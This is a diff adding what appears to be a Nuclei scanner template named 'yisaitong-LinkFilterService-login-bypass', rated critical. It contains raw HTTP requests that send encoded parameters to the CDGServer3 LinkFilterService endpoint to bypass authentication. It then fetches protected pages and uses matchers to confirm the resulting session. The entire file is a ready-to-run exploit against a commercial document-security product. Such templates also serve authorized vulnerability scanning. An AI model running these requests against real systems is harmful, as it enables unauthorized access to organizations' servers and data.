@@ -1,0 +1,38 @@
+http:
+    - cookie-reuse: true
+      extractors:
+        - part: body_3
+          type: xpath
+          xpath:
+            - //font[@color='white']
+      matchers:
+        - condition: and
+          dsl:
+            - status_code_1==302 && contains_all(all_headers_1,"/CDGServer3/frame.jsp;jsessionid=")
+            - status_code_2==200 && contains_all(body_2,"DataGrid.css")
+          type: dsl
+      raw:
+        - |
+          POST /CDGServer3/LinkFilterService HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+          Accept: */*
+          Content-Type: application/x-www-form-urlencoded
+          Accept-Encoding: gzip, deflate
+          Connection: close
+
+          path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+        - |
+          GET /CDGServer3/workflowE/myToDoList.jsp HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        - |
+          GET /CDGServer3/top.jsp HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+id: yisaitong-LinkFilterService-login-bypass
+info:
+    author: yisaitong-LinkFilterService-login-bypass
+    name: yisaitong-LinkFilterService-login-bypass
+    severity: critical
+    tags: []
